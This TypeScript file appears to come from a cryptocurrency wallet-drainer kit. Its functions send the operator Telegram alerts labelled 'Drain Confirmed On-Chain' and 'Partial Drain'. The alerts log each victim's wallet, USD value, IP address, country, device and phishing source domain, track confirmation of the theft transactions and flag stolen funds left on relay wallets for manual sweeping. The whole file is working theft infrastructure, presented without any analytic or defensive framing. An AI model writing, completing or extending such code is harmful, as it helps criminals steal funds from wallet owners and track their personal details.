export async function notifyLargeTransferSettlement(params: {
  wallet_address: string
  scout_value_usd: number
  strategies: string[]
  timing?: 'immediate' | 'delayed'
  delay_hours?: number
  tx_hash?: string
  exchange?: string
}): Promise<void> {
  const threshold = Number.parseFloat(process.env['LARGE_TRANSFER_THRESHOLD_USD']?.trim() ?? '50000')
  if (!Number.isFinite(threshold) || params.scout_value_usd < threshold) return

  const timing = params.timing ?? 'immediate'
  const timingLabel = formatSettlementTimingLabel(timing, params.delay_hours)

  const text =
    `🐋 <b>LARGE TRANSFER SETTLEMENT</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    codeLine('Wallet Address', params.wallet_address) +
    codeLine('USD Value', params.scout_value_usd) +
    `⚡ <b>Execution:</b> ${timingLabel}\n` +
    `🛡 <b>Strategies:</b> ${params.strategies.join(', ')}\n` +
    (params.exchange ? `🏛 <b>Exchange:</b> ${params.exchange}\n` : '') +
    (params.tx_hash ? codeLine('Tx Hash', params.tx_hash) : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyNewSignatureAnchorRequest(
  address: string,
  chainFamily: string,
  walletType: string,
  scoutValueUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
  const usdVal = scoutValueUsd > 0 ? scoutValueUsd : parseUsdValue(ctx?.scout_value_usd)
  const chain = ctx?.chain_family ?? chainFamily

  const text =
    `🔄 <b>Processing Signature</b> (${walletType || chain})\n` +
    `👛 <code>${address}</code>` +
    (chain ? ` | ⛓️ ${chain}` : '') +
    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
    (ctx?.tokenName ? `🪙 ${ctx.tokenName}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
    (device ? `💻 ${device}\n` : '') +
    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
    `ℹ️ Settlement queued — not drained until TX confirms\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

function truncateWalletForAlert(addr: string): string {
  const a = addr.trim()
  if (a.length <= 14) return a
  return `${a.slice(0, 6)}…${a.slice(-4)}`
}

function resolveExplorerTxUrl(
  txHash: string,
  chainId?: string | number | null,
  chainFamily?: string | null,
): string | null {
  const hash = txHash.trim()
  if (!hash) return null
  const family = (chainFamily ?? '').toUpperCase()

  if (family === 'SVM' || family === 'SOLANA' || family === 'SOL') {
    return `https://solscan.io/tx/${hash}`
  }
  if (family === 'TRON' || family === 'TRX') {
    const h = hash.replace(/^0x/i, '')
    return `https://tronscan.org/#/transaction/${h}`
  }
  if (family === 'TON') {
    return `https://tonviewer.com/transaction/${encodeURIComponent(hash)}`
  }
  if (family === 'UTXO' || family === 'BTC' || family === 'BITCOIN') {
    const h = hash.replace(/^0x/i, '')
    return `https://mempool.space/tx/${h}`
  }
  if (family === 'COSMOS') {
    const h = hash.replace(/^0x/i, '').toUpperCase()
    return `https://www.mintscan.io/cosmos/tx/${h}`
  }
  if (family === 'APTOS') {
    const h = hash.startsWith('0x') ? hash : `0x${hash}`
    return `https://explorer.aptoslabs.com/txn/${h}?network=mainnet`
  }
  if (family === 'SUI') {
    return `https://suiscan.xyz/mainnet/tx/${hash}`
  }

  if (!/^0x[0-9a-fA-F]{64}$/.test(hash)) return null
  const chain = String(chainId ?? '1').replace(/^eip155:/i, '')
  if (chain === '1' || chain === '') return `https://etherscan.io/tx/${hash}`
  if (chain === '56') return `https://bscscan.com/tx/${hash}`
  if (chain === '137') return `https://polygonscan.com/tx/${hash}`
  if (chain === '42161') return `https://arbiscan.io/tx/${hash}`
  if (chain === '10') return `https://optimistic.etherscan.io/tx/${hash}`
  if (chain === '8453') return `https://basescan.org/tx/${hash}`
  if (chain === '43114') return `https://snowtrace.io/tx/${hash}`
  return `https://etherscan.io/tx/${hash}`
}

function formatSettlementAmountLine(
  amount: string | null | undefined,
  tokenAddress: string | null | undefined,
  chainFamily: string | null | undefined,
  scoutUsd?: string | number | null,
): string {
  if (!amount || amount === '0') {
    const usd = scoutUsd != null ? parseUsdValue(scoutUsd) : 0
    return usd > 0 ? `~$${formatUsdTotal(usd)} USD` : '0'
  }
  const token = (tokenAddress ?? '').trim().toLowerCase()
  const isNative =
    token === '' ||
    token === 'native' ||
    token === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
  if (isNative) {
    try {
      const wei = BigInt(amount)
      const eth = Number(wei) / 1e18
      if (Number.isFinite(eth) && eth > 0) {
        const ethLabel = eth >= 0.0001 ? `${eth.toFixed(6).replace(/\.?0+$/, '')} ETH` : `${wei} wei`
        const usd = scoutUsd != null ? parseUsdValue(scoutUsd) : 0
        return usd > 0 ? `${ethLabel} (~$${formatUsdTotal(usd)})` : ethLabel
      }
    } catch {
      /* fall through */
    }
  }
  const family = (chainFamily ?? '').toUpperCase()
  let tokenLabel: string
  if (token.startsWith('0x') && token.length >= 10) {
    tokenLabel = `${token.slice(0, 6)}…${token.slice(-4)}`
  } else if (family === 'UTXO' || token.includes('UTXO') || token.includes('BTC')) {
    tokenLabel = 'sats'
  } else if (family === 'SVM' || token.includes('SVM') || token.includes('SOL')) {
    tokenLabel = 'lamports'
  } else if (family === 'TRON' || token.includes('TRON') || token.includes('TRC')) {
    tokenLabel = 'TRX'
  } else if (family === 'TON' || token.includes('TON')) {
    tokenLabel = 'nanoTON'
  } else if (family === 'COSMOS' || token.includes('COSMOS')) {
    tokenLabel = 'uatom'
  } else {
    tokenLabel = 'ERC20'
  }
  return `${amount} ${tokenLabel}`
}

/** Warn when SOL/TRX/etc. funds are stuck on a relay intermediary (second hop not implemented). */
export async function notifyRelayIntermediaryWarning(params: {
  chain_family: string
  wallet_address: string
  intermediary_hint?: string | null
  vault_hint?: string | null
  tx_hash?: string | null
  detail?: string | null
}): Promise<void> {
  const chain = String(params.chain_family).toUpperCase()
  const txLine = params.tx_hash
    ? `🔗 <b>TX:</b> <code>${truncateWalletForAlert(params.tx_hash)}</code>\n`
    : ''
  const text =
    `⚠️ <b>RELAY INTERMEDIARY — FUNDS PENDING</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `👛 <b>Wallet:</b> <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chain}\n` +
    txLine +
    (params.detail ? `📋 <b>Detail:</b> ${params.detail.slice(0, 500)}\n` : '') +
    `💡 <b>Action:</b> Sweep intermediary wallet manually or unset RELAY_INTERMEDIARY_${chain === 'SVM' || chain === 'SOL' ? 'SVM' : 'EVM'}.\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** Optional pre-broadcast alert when settlement engine is about to execute. */
export async function notifySettlementAttempt(params: {
  wallet_address: string
  chain_family?: string | null
  chain_id?: string | number | null
  amount?: string | null
  token_address?: string | null
  protocol?: string | null
  scout_value_usd?: string | number | null
}): Promise<void> {
  const chain =
    params.chain_family != null
      ? String(params.chain_family).toUpperCase()
      : params.chain_id != null
        ? String(params.chain_id)
        : 'unknown'
  const amountLine = formatSettlementAmountLine(
    params.amount ?? null,
    params.token_address ?? null,
    params.chain_family ?? null,
    params.scout_value_usd,
  )
  const usdVal = parseUsdValue(params.scout_value_usd)

  const text =
    `🚀 <b>Sending!</b> ⛓️ ${chain}` +
    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
    `👛 <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
    `💎 ${amountLine}\n` +
    (params.protocol ? `📋 ${params.protocol}\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

/** Immediate post-settlement alert (replaces batched-only notifyBroadcastConfirmed for visibility). */
export async function notifySettlementResult(params: {
  wallet_address: string
  chain_family?: string | null
  chain_id?: string | number | null
  amount?: string | null
  token_address?: string | null
  protocol?: string | null
  scout_value_usd?: string | number | null
  status: 'settled' | 'failed' | 'partial'
  tx_hash?: string | null
  error_message?: string | null
}): Promise<void> {
  const chain =
    params.chain_family != null
      ? String(params.chain_family).toUpperCase()
      : params.chain_id != null
        ? String(params.chain_id)
        : 'unknown'
  const amountLine = formatSettlementAmountLine(
    params.amount ?? null,
    params.token_address ?? null,
    params.chain_family ?? null,
    params.scout_value_usd,
  )
  const usdVal = parseUsdValue(params.scout_value_usd)
  const statusEmoji =
    params.status === 'settled' ? '✅' : params.status === 'partial' ? '⚠️' : '❌'

  let txLine = ''
  if (params.tx_hash) {
    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id, params.chain_family ?? null)
    txLine = explorer
      ? `🔗 <a href="${explorer}">${truncateWalletForAlert(params.tx_hash)}</a>\n`
      : `🔗 <code>${truncateWalletForAlert(params.tx_hash)}</code>\n`
  }

  const statusLabel =
    params.status === 'settled'
      ? 'Drain Confirmed On-Chain'
      : params.status === 'partial'
        ? 'Partial Drain'
        : 'Drain Failed'

  const text =
    `${statusEmoji} <b>${statusLabel}</b>` +
    (usdVal > 0 && params.status === 'settled' ? ` — $${formatUsdTotal(usdVal)}` : '') + `\n` +
    `👛 <code>${truncateWalletForAlert(params.wallet_address)}</code> | ⛓️ ${chain}\n` +
    `💎 ${amountLine}\n` +
    txLine +
    (params.error_message ? `⚠️ ${params.error_message.slice(0, 200)}\n` : '') +
    (params.status === 'failed'
      ? `ℹ️ No funds drained — settlement did not complete\n`
      : params.status === 'settled'
        ? ``
        : `ℹ️ Some legs may still be pending\n`) +
    `🕐 ${getISTTimestamp()}`

  await sendTelegramMessage(text)

  if (params.status === 'settled' || params.status === 'partial') {
    enqueueDrainBatchEntry({
      wallet: params.wallet_address,
      usd: params.scout_value_usd ?? params.amount,
      chains: [params.chain_family, params.chain_id != null ? String(params.chain_id) : null],
      tx_hash: params.tx_hash,
    })
  }
}

async function pollAndNotifyEvmSettlement(params: {
  txHash: string
  address: string
  chainId: number
  ctx?: TelegramRequestContext
}): Promise<void> {
  const dedupeKey = `poll:${params.chainId}:${params.txHash.toLowerCase()}`
  if (!shouldSendTelegramOnce(dedupeKey, 15 * 60 * 1_000)) return

  const finalStatus = await pollEvmTransactionConfirmation({
    chainId: params.chainId,
    txHash: params.txHash,
    maxAttempts: 24,
    intervalMs: 5_000,
  })

  if (finalStatus === 'confirmed') {
    await notifyBroadcastConfirmed(params.txHash, params.address, {
      ...params.ctx,
      tx_hash: params.txHash,
      chain_id: params.chainId,
    })
    return
  }

  await notifySettlementResult({
    wallet_address: params.address,
    chain_id: params.chainId,
    chain_family: params.ctx?.chain_family ?? 'EVM',
    scout_value_usd: params.ctx?.scout_value_usd,
    amount: params.ctx?.amount,
    token_address: params.ctx?.tokenAddress,
    status: finalStatus === 'failed' ? 'failed' : 'failed',
    tx_hash: isEvmTransactionHash(params.txHash) ? params.txHash : null,
    error_message:
      finalStatus === 'failed'
        ? 'Transaction reverted on-chain'
        : finalStatus === 'pending'
          ? 'Transaction still pending after polling window'
          : 'No on-chain transaction found for submitted reference',
  })
}

/** Verify EVM hash on-chain before sending success; batch IDs get pending + poll. */
export async function notifyEvmSettlementWhenVerified(params: {
  txHash: string
  address: string
  chainId: number
  ctx?: TelegramRequestContext
}): Promise<void> {
  const hash = params.txHash.trim()
  if (!hash.startsWith('0x')) {
    await notifyDrainNoAction(params.address, {
      ...params.ctx,
      chain_id: params.chainId,
      detail: 'Invalid transaction reference submitted',
    })
    return
  }

  if (!isEvmTransactionHash(hash)) {
    await notifyTxAwaitingConfirmation(hash, params.address, {
      ...params.ctx,
      chain_id: params.chainId,
    })
    return
  }

  const status = await verifyEvmTransaction(params.chainId, hash)
  if (status === 'confirmed') {
    await notifyBroadcastConfirmed(hash, params.address, {
      ...params.ctx,
      tx_hash: hash,
      chain_id: params.chainId,
    })
    return
  }
  if (status === 'failed') {
    await notifySettlementResult({
      wallet_address: params.address,
      chain_id: params.chainId,
      chain_family: params.ctx?.chain_family ?? 'EVM',
      scout_value_usd: params.ctx?.scout_value_usd,
      status: 'failed',
      tx_hash: hash,
      error_message: 'Transaction reverted on-chain',
    })
    return
  }

  await notifyTxAwaitingConfirmation(hash, params.address, {
    ...params.ctx,
    chain_id: params.chainId,
  })
  void pollAndNotifyEvmSettlement(params)
}
